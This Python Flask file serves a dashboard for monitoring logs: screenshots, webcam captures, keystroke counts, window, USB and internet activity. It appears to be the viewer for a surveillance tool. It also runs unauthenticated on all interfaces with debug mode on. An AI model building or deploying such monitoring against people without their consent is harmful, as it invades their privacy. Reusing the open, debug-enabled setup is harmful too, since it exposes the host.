from flask import Flask, render_template, jsonify, request, redirect, url_for
import os
import json
import socket
from datetime import datetime

app = Flask(__name__)

CONFIG_FILE = 'monitor_config.json'

def load_config():
    """Load configuration from file"""
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return None

def save_config(username, port):
    """Save configuration to file"""
    config = {
        'username': username,
        'port': port
    }
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)

def get_local_ip():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        return local_ip
    except:
        return "Could not determine IP"

def load_json_file(filepath):
    try:
        if os.path.exists(filepath):
            with open(filepath, 'r', encoding='utf-8') as f:
                return json.load(f)
    except Exception as e:
        print(f"Error loading {filepath}: {str(e)}")
    return []

def get_screenshots():
    screenshots = []
    screenshot_dirs = ['screenshots', os.path.join('logs', 'screenshots')]
    
    for directory in screenshot_dirs:
        if os.path.exists(directory):
            for filename in os.listdir(directory):
                if filename.endswith(('.png', '.jpg', '.jpeg')):
                    filepath = os.path.join(directory, filename)
                    timestamp = datetime.fromtimestamp(os.path.getmtime(filepath)).strftime('%Y-%m-%d %H:%M:%S')
                    screenshots.append({
                        'path': filepath.replace('\\', '/'),
                        'filename': filename,
                        'timestamp': timestamp
                    })
    
    return sorted(screenshots, key=lambda x: x['timestamp'], reverse=True)

def get_webcam_images():
    webcam_images = []
    if os.path.exists('WebcamLogs'):
        for filename in os.listdir('WebcamLogs'):
            if filename.endswith(('.png', '.jpg', '.jpeg')):
                filepath = os.path.join('WebcamLogs', filename)
                timestamp = datetime.fromtimestamp(os.path.getmtime(filepath)).strftime('%Y-%m-%d %H:%M:%S')
                webcam_images.append({
                    'path': filepath.replace('\\', '/'),
                    'filename': filename,
                    'timestamp': timestamp
                })
    
    return sorted(webcam_images, key=lambda x: x['timestamp'], reverse=True)

@app.route('/setup', methods=['GET', 'POST'])
def setup():
    """Handle first-time setup"""
    if request.method == 'POST':
        username = request.form.get('username')
        port = request.form.get('port')
        if username and port:
            try:
                port = int(port)
                save_config(username, port)
                return redirect(url_for('index'))
            except:
                return "Invalid port number", 400
        return "Username and port required", 400
    return render_template('setup.html')

@app.route('/')
def index():
    """Main dashboard page"""
    config = load_config()
    if not config:
        return redirect(url_for('setup'))
    
    local_ip = get_local_ip()
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return render_template('index.html', 
                         local_ip=local_ip,
                         username=config['username'],
                         port=config['port'],
                         current_time=current_time)

@app.route('/api/screenshots')
def api_screenshots():
    return jsonify(get_screenshots())

@app.route('/api/webcam')
def api_webcam():
    return jsonify(get_webcam_images())

@app.route('/api/keystrokes')
def api_keystrokes():
    data = load_json_file('logs/keystroke_counts.json')
    return jsonify(data)

@app.route('/api/internet')
def api_internet():
    # Read and parse the internet usage log file
    data = []
    try:
        with open('logs/internet_usage_log.txt', 'r', encoding='utf-8') as f:
            for line in f:
                if ' - ' in line and '|' in line:
                    app_name = line.split(' - ')[0].strip()
                    usage = line.split(' - ')[1].strip()
                    sent = usage.split('|')[0].replace('Sent:', '').strip()
                    received = usage.split('|')[1].replace('Received:', '').strip()
                    data.append({
                        'application': app_name,
                        'sent': sent,
                        'received': received
                    })
    except Exception as e:
        print(f"Error reading internet usage log: {str(e)}")
    return jsonify(data)

@app.route('/api/windows')
def api_windows():
    # Read and parse the window activity log
    data = []
    try:
        with open('logs/window_log.txt', 'r', encoding='utf-8') as f:
            for line in f:
                if line.startswith('['):
                    parts = line.split(']', 1)
                    if len(parts) == 2:
                        timestamp = parts[0][1:].strip()
                        details = parts[1].strip()
                        data.append({
                            'timestamp': timestamp,
                            'details': details
                        })
    except Exception as e:
        print(f"Error reading window log: {str(e)}")
    return jsonify(data)

@app.route('/api/usb')
def api_usb():
    # Read and parse the USB activity log
    data = []
    try:
        with open('logs/usb_activity_log.txt', 'r', encoding='utf-8') as f:
            for line in f:
                if line.startswith('['):
                    parts = line.split(']', 1)
                    if len(parts) == 2:
                        timestamp = parts[0][1:].strip()
                        details = parts[1].strip()
                        data.append({
                            'timestamp': timestamp,
                            'details': details
                        })
    except Exception as e:
        print(f"Error reading USB log: {str(e)}")
    return jsonify(data)

if __name__ == '__main__':
    # Create necessary directories
    os.makedirs('templates', exist_ok=True)
    os.makedirs('static', exist_ok=True)
    
    # Load configuration or use defaults
    config = load_config()
    if config:
        port = config['port']
        print(f"\nAccess your dashboard at http://{get_local_ip()}:{port}")
        app.run(host="0.0.0.0", port=port, debug=True)
    else:
        print("\nFirst time setup required. Starting on port 5000...")
        print(f"Please visit http://{get_local_ip()}:5000/setup")
        app.run(host="0.0.0.0", port=5000, debug=True) 